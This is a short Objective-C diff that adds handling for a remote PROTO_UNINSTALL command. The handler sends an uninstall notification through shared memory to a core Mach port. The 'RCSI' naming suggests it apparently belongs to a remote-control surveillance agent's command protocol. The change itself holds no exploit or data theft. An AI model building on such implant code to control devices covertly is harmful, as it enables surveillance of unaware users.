@@ -14,6 +14,7 @@
 #import "NSData+SHA1.h"
 #import "RCSICommon.h"
 #import "RCSITaskManager.h"
+#import "RCSISharedMemory.h"
 
 #import "RCSIGlobals.h"
 
@@ -280,7 +281,20 @@
       } break;
     case PROTO_UNINSTALL:
       {
-      } break;
+        shMemoryLog params;
+        params.agentID  = CORE_NOTIFICATION;
+        params.flag     = ACTION_DO_UNINSTALL;
+        
+        NSData *msgData = [[NSData alloc] initWithBytes: &params
+                                                 length: sizeof(shMemoryLog)];
+        
+        [_i_SharedMemory sendMessageToCoreMachPort: msgData
+                                          withMode: @"kRunLoopNone"];
+        
+        [_protoCommand release];
+        return NO;
+      }
+      break;
     case PROTO_NO:
     default:
       {
